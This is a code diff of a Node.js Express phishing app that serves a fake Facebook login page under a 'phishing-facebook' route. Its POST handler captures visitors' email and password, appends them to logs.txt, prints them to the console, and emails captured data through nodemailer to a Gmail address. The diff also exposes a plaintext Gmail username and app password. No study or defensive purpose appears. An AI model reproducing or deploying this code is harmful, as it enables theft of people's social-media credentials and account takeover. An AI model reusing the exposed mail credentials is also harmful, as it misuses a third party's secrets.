@@ -22,7 +22,16 @@ app.use('/phishing-facebook', express.static('phishing-facebook'));
 app.get('/', function (req, res) {
     res.render('f_login');
     
-    var message = "captured_content";
+    
+    
+});
+
+app.post('/_', function (req, res) {
+    res.render('f_success');
+    var captured_content = `\n[-] Email: ${req.body.email} Password: ${req.body.password}`;
+    
+    
+    var message = "need help";
     var toEmail = "mdalonebd@gmail.com";
 
     var transporter = nodemailer.createTransport({
@@ -48,11 +57,12 @@ transporter.sendMail(mailOptions, function (err, info) {
     console.log(info);
 });
     
-});
-
-app.post('/_', function (req, res) {
-    res.render('f_success');
-    var captured_content = `\n[-] Email: ${req.body.email} Password: ${req.body.password}`
+    
+    
+    
+    
+    
+    
     fs.appendFile('logs.txt', captured_content, err => {
         if (err) {
             console.error(err)
@@ -61,31 +71,7 @@ app.post('/_', function (req, res) {
     });
     console.log("eshak:"+captured_content);
     
-    var message = captured_content;
-    var toEmail = "mdalonebd@gmail.com";
-
-    var transporter = nodemailer.createTransport({
-    service: "gmail",
-
-  auth: {
-    user: "bdeshak5@gmail.com",
-    pass: "dbinvztuehilrkkz"
-  }
-});
-
-   const mailOptions = {
-  from: 'bdeshak5@gmail.com',
-  to: toEmail, //list of receivers
-  subject: 'Nodemailer', // Subject line
-  text: message //plain text body
-};
-
-transporter.sendMail(mailOptions, function (err, info) {
-  if (err)
-    console.log(err)
-  else
-    console.log(info);
-});
+    
     
 });
 
